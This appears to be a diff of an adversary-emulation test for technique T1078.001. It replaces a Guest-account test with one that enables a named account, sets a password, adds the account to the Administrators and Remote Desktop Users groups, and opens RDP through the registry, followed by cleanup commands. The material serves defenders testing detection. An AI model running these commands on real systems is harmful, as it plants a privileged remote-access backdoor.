@@ -1,20 +1,21 @@
 T1078.001
 ###### Step 1 Attack
 ```
-net user Guest /active:yes
-net user Guest winter2022
-net localgroup Administrators Guest /add
-net localgroup "Remote Desktop Users" Guest /add
+net user HaHa_746973985202 /active:yes
+net user HaHa_746973985202 L@zarus_apt99
+net localgroup Administrators HaHa_746973985202 /add
+net localgroup "Remote Desktop Users" HaHa_746973985202 /add
 reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
 reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
 ```
 ###### Step 2 Cleanup
 ```
-net user Guest /active:no >nul 2>&1
-net localgroup Administrators Guest /delete >nul 2>&1
-net localgroup "Remote Desktop Users" Guest /delete >nul 2>&1
-if (Test-Path "hklm\system\CurrentControlSet\Control\Terminal Server") {write-host "Skipping Cleanup - RDP connection configurations are already compromised." -ForegroundColor Cyan} else {write-host "Compromised RDP accounts have been deleted. Time to cleanup the registry... T1078.001 1 - Enable Guest account with RDP capability and admin privileges" -ForegroundColor Cyan}
-reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1
+net user HaHa_746973985202 /active:no >nul 2>&1
+net localgroup Administrators HaHa_746973985202 /delete >nul 2>&1
+net localgroup "Remote Desktop Users" HaHa_746973985202 /delete >nul 2>&1
+if 1 NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
+if 1 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
+if 1 EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
 ```
 ```
 reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1
